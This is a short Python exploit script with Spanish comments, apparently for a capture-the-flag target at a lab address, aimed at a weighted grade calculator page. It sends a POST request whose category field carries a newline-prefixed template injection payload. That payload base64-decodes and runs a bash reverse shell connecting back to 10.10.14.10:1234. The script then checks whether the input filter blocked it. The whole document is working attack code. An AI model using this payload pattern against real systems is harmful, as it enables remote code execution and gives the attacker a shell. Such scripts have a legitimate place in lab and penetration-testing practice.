
import requests 
import base64


#URL de la máquina atacada
url = "http://10.10.11.253/weighted-grade-calc"



#Shell inversa para conectarse a la máquina atacante
rev_shell = b'/bin/bash -i >& /dev/tcp/10.10.14.10/1234 0>&1'



# Codificación base64 del comando de shell inverso 
encoded_data = base64.b64encode(rev_shell)
remove_byte = encoded_data.decode('utf-8') 


#Payload con el comando para decodificar y ejecutar el shell inverso

payload_data = {
        "category1": f"test\n<%= system('echo \"{remove_byte}\" | base64 -d | bash') %>",
        "grade1": "46",  
        "weight1": "50",

        "category2": "admin",
        "grade2": "46",  
        "weight2": "20",
 
        "category3": "hello",
        "grade3": "46",  
        "weight3": "10",
 
        "category4": "world",
        "grade4": "46",  
        "weight4": "10",
   
        "category5": "N/A",
        "grade5": "46",  
        "weight5": "10"
}

print("[+] Payload is being executed..😍 \n[+]..now check your listener")

# Enviar la solicitud POST con el payload
r = requests.post(url, data=payload_data)


# Verificar si el payload fue bloqueado
if "Malicious input blocked" in r.text:
     print("[-] Failed to execute payload, it was blocked 😥")
else:
     print("[+] Payload executed successfully")



